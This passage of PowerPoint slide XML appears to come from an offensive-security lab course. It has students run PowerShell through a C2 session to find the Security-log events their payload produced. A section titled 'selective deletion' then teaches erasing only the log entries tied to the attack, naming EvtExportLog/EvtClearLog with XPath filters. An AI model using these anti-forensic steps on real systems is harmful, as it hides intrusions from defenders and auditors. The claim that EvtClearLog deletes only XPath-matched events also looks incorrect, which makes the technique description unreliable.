              <a:t>Look for your payload process name (test.exe). Note the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="0" i="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>ProcessId</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t> and </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="0" i="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>CommandLine</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="27782125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D03390A-617C-3801-9E4C-C54C36ABCE83}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="220855"/>
            <a:ext cx="12192000" cy="6074099"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>Step 5: View Special Privilege Assignment Events (4672)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>execute -o </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>powershell</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t> -c "Get-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>WinEvent</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t> -</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>FilterHashtable</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t> @{LogName='Security'; ID=4672} -</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>MaxEvents</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t> 10 | Format-List"</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>This shows admin privilege assignments. If you ran as administrator, you will see an event tied to your session.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" b="0" i="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="F9FAFB"/>
              </a:solidFill>
              <a:effectLst/>
              <a:latin typeface="quote-cjk-patch"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>Step 6: View Firewall Connection Events (5156)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>execute -o </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>powershell</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t> -c "Get-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>WinEvent</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t> -</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>FilterHashtable</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t> @{LogName='Security'; ID=5156} -</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>MaxEvents</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t> 10 | Format-List"</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>This shows outbound connections. Your payload connecting to your Kali listener will appear here.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" b="0" i="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="F9FAFB"/>
              </a:solidFill>
              <a:effectLst/>
              <a:latin typeface="quote-cjk-patch"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>Step 7: Correlate Using </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>LogonId</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" b="0" i="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="F9FAFB"/>
              </a:solidFill>
              <a:effectLst/>
              <a:latin typeface="quote-cjk-patch"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>First, get the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>LogonId</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t> from your session:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>execute -o </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>powershell</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t> -c "Get-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>WinEvent</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t> -</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>FilterHashtable</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t> @{LogName='Security'; ID=4624} -</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>MaxEvents</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t> 1 | Select-Object -</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>ExpandProperty</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t> Properties"</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>Then find all events from that session:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>execute -o </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>powershell</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t> -c "Get-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>WinEvent</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t> -</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>LogName</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t> Security | Where-Object { $_.Properties[?].Value -eq 'YOUR_LOGON_ID' }"</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>Summary – What You Have Identified:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="170000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>Event ID 4624 – Successful logon – Proves authentication.</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>Event ID 4672 – Special privileges assigned – Proves admin access.</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>Event ID 4688 – Process creation – Shows your payload ran.</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>Event ID 5156 – Firewall allow connection – Shows C2 traffic.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="20635205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40E760-CECA-A9FD-1320-8EC5442F6DEF}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="0"/>
            <a:ext cx="12192000" cy="6858000"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>**TASK 01 – PART 2: SELECTIVE DELETION VIA POWERSHELL/.NET**</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>What Is Selective Deletion?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Instead of clearing the entire Security log, you use the Windows Event Log API to delete only the events that match your attack criteria. This is done by executing .NET code through your C2 using the execute-assembly command. The code calls </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>EvtExportLog</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> and </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>EvtClearLog</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> with custom XPath queries that filter events based on Event ID, timestamp, source IP, or user context.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>The Win32 API functions used are:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>EvtExportLog</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> – Exports events that match your XPath query to a temporary file.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>EvtClearLog</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> – Clears events from the log that match your XPath query.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="1700" dirty="0">
              <a:solidFill>
                <a:schemeClr val="bg1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Step 1: Create a Backup of the Security Log (Before Deletion)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>First, export the entire Security log to a backup file. This ensures you have a copy in case something goes wrong.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Run this command through your C2 session:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>execute -o </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>powershell</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> -c "</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>wevtutil</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>epl</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Security C:\temp\security_backup.evtx“</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="1700" dirty="0">
              <a:solidFill>
                <a:schemeClr val="bg1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Step 2: Build Your XPath Query</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>An XPath query filters events based on specific criteria. You need to target only the events generated by your attack.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Example – Delete only Event ID 4624 that occurred between 14:30 and 14:35 on August 20, 2026:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>*[System[(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0" err="1">
                <a:solidFill>
